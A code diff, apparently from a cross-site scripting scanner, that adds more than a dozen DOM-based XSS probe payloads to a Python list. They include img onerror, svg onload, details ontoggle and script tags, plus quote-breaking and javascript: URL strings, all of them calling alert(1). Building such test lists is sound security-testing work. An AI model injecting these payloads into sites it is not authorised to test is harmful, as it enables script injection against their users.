@@ -1,14 +1,22 @@
 from __future__ import annotations
 
-# DOM 쿼리 소스(location.search)용 payload — fragment와 달리 "#" 접두 없이 ?name= 값으로 주입
 _DOM_QUERY_PAYLOADS = [
     "<img src=x onerror=alert(1)>",
     "<svg onload=alert(1)>",
+    "<video src=x onerror=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "<marquee onstart=alert(1)>xss</marquee>",
+    "<img src=x onerror=alert`1`>",
     '"><img src=x onerror=alert(1)>',
+    "'><img src=x onerror=alert(1)>",
+    "<script>alert(1)</script>",
+    "<svg><script>alert(1)</script></svg>",
     "'-alert(1)-'",
     '";alert(1);//',
+    "';alert(1);//",
+    "${alert(1)}", 
     "javascript:alert(1)",
-    "<script>alert(1)</script>",
 ]
 
 XSS_RULES: list[dict] = [
